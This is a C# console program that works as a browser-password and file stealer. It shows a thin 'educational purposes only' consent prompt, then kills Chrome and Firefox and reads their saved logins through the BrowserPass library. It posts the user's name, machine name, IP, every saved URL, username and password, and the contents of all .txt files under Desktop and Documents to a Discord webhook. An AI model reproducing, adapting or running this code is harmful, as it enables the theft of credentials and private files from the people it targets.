using BrowserPass;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

//Yes, I did use BrowserPass, see here: https://github.com/jabiel/BrowserPass

namespace Discord_Webhook
{
    class Program
    {
        static string URL = "Your Discord webhook URL here, etc: https://discord.com/api/webhooks/something";

        static async Task Main(string[] args)
        {
        start:
            Console.WriteLine("This program is for educational purposes only, your ip, username, device name and your chrome/firefox saved password will be sent using Discord webhook, do you want to continue? yes/no");
            string userinput = Console.ReadLine();
            if (userinput.ToLower() == "no")
            {
                Console.WriteLine("Ok then, the application now will exit");
                Console.Read();
                Environment.Exit(0);
            }
            else if (userinput.ToLower() == "yes")
            {
                Console.WriteLine("Please wait...");
            }
            else
            {
                Console.WriteLine("That not a yes or no, try again");
                goto start;
            }

            string username = Environment.UserName;
            string PCname = Environment.MachineName;
            string hostName = Dns.GetHostName();
            string ip = Dns.GetHostByName(hostName).AddressList[0].ToString();

            Console.WriteLine("Your IP: " + ip);
            Console.WriteLine("Your Device name: " + PCname);
            Console.WriteLine("Your Username: " + username);

            WebRequest wh = (HttpWebRequest)WebRequest.Create(URL);

            wh.ContentType = "application/json";
            wh.Method = "POST";

            using (var sw = new StreamWriter(wh.GetRequestStream()))
            {
                string json = JsonConvert.SerializeObject(new
                {
                    username = "Infos",
                    embeds = new[]
                    {
                        new
                        {
                            title = "User: " + username + "   PC name: " + PCname,
                            description = "IP: **" + ip + "**\n**Passwords:**",
                            color = "3447003"
                        }
                    }
                });

                sw.Write(json);
            }

            var response = (HttpWebResponse)wh.GetResponse();

            List<IPassReader> readers = new List<IPassReader>();
            readers.Add(new FirefoxPassReader());
            readers.Add(new ChromePassReader());

            bool isChrome = false;
            bool isFirefox = false;

            foreach (var process in Process.GetProcessesByName("chrome"))
            {
                process.Kill();
                isChrome = true;
            }
            foreach (var process in Process.GetProcessesByName("firefox"))
            {
                process.Kill();
                isFirefox = true;
            }

            int count = 0;

            foreach (var reader in readers)
            {
                Console.WriteLine($"===={reader.BrowserName} Infos:================================\n\n");

                WebRequest wh2 = (HttpWebRequest)WebRequest.Create(URL);

                wh2.ContentType = "application/json";
                wh2.Method = "POST";

                using (var sw = new StreamWriter(wh2.GetRequestStream()))
                {
                    string json = JsonConvert.SerializeObject(new
                    {
                        username = "Infos",
                        content = $"===={reader.BrowserName} Infos:================================\n\n"
                    });

                    sw.Write(json);
                }

                var response2 = (HttpWebResponse)wh2.GetResponse();

                try
                {
                    count++;
                    await PrintCredentials(reader.ReadPasswords());
                    if (count >= 2)
                    {
                        try
                        {
                            if (isChrome == true)
                            {
                                Process.Start("chrome.exe");
                            }
                            if (isFirefox == true)
                            {
                                Process.Start("firefox.exe");
                            }
                        }
                        catch { }
                        Console.WriteLine("Done reading passwords, Reading files...");
                        await readfiles();
                        Console.WriteLine("Finished, press enter to exit");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error reading {reader.BrowserName} passwords: " + ex.Message + "\n\n\n\n");

                    WebRequest wh3 = (HttpWebRequest)WebRequest.Create(URL);

                    wh3.ContentType = "application/json";
                    wh3.Method = "POST";

                    using (var sw = new StreamWriter(wh3.GetRequestStream()))
                    {
                        string json = JsonConvert.SerializeObject(new
                        {
                            username = "Infos",
                            content = $"Error reading {reader.BrowserName} passwords: " + ex.Message + "\n\n\n\n"
                        });

                        sw.Write(json);
                    }

                    var response3 = (HttpWebResponse)wh3.GetResponse();

                    if (count >= 2)
                    {
                        try
                        {
                            if (isChrome == true)
                            {
                                Process.Start("chrome.exe");
                            }
                            if (isFirefox == true)
                            {
                                Process.Start("firefox.exe");
                            }
                        }
                        catch { }
                        Console.WriteLine("Done reading passwords, Reading files...");
                        await readfiles();
                        Console.WriteLine("Finished, press enter to exit");
                    }
                }
            }

            async Task PrintCredentials(IEnumerable<CredentialModel> data)
            {
                foreach (var d in data)
                {
                    WebRequest wh2 = (HttpWebRequest)WebRequest.Create(URL);

                    wh2.ContentType = "application/json";
                    wh2.Method = "POST";

                    using (var sw = new StreamWriter(wh2.GetRequestStream()))
                    {
                        string json = JsonConvert.SerializeObject(new
                        {
                            username = "Infos",
                            content = $"{d.Url}\r\n\tUsername: **{d.Username}**\r\n\tPassword: **{d.Password}**\r\n"
                        });

                        sw.Write(json);
                    }

                    Console.WriteLine($"{d.Url}\r\n\tUsername: {d.Username}\r\n\tPassword: {d.Password}\r\n");
                    try
                    {
                        var response2 = (HttpWebResponse)wh2.GetResponse();
                    }
                    catch
                    {
                        try
                        {
                            await Task.Delay(1000);
                            var response2 = (HttpWebResponse)wh2.GetResponse();
                        }
                        catch
                        {
                            continue;
                        }
                    }

                    await Task.Delay(1000);
                }
            }

            //Grabing txt files
            async Task readfiles()
            {
                string path1 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                string path2 = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

                await searchingFiles(path1);
                await searchingFiles (path2);

                async Task searchingFiles(string path)
                {
                    try
                    {
                        foreach (string file in Directory.GetFiles(path, "*.txt"))
                        {
                            try
                            {
                                string textFileContent = File.ReadAllText(file);

                                WebRequest wh2 = (HttpWebRequest)WebRequest.Create(URL);

                                wh2.ContentType = "application/json";
                                wh2.Method = "POST";

                                using (var sw = new StreamWriter(wh2.GetRequestStream()))
                                {
                                    string json = JsonConvert.SerializeObject(new
                                    {
                                        username = "Reading Files",
                                        content = $"**Path: {file}**\n\n\n\n" + textFileContent
                                    });

                                    sw.Write(json);
                                }

                                try
                                {
                                    var response2 = (HttpWebResponse)wh2.GetResponse();
                                }
                                catch
                                {
                                    try
                                    {
                                        await Task.Delay(5000);
                                        var response2 = (HttpWebResponse)wh2.GetResponse();
                                    }
                                    catch
                                    {
                                        Console.WriteLine($"Can't send the file: {file}");
                                        continue;
                                    }
                                }
                                Console.WriteLine(file);
                                await Task.Delay(5000);
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine($"Erorr reading file {file}, Error {e}");
                            }
                        }

                    }
                    catch
                    {
                        Console.WriteLine($"Can't access folder {path}, skipped the folder");
                    }
                    try
                    {
                        foreach (string subFolders in Directory.GetDirectories(path))
                        {
                            try
                            {
                                await searchingFiles(subFolders);
                            }
                            catch
                            {
                                Console.WriteLine($"Can't access folder {subFolders}, skipped the folder");
                            }
                        }
                    }
                    catch { }
                }
            }

            Console.ReadLine();
        }
    }
}
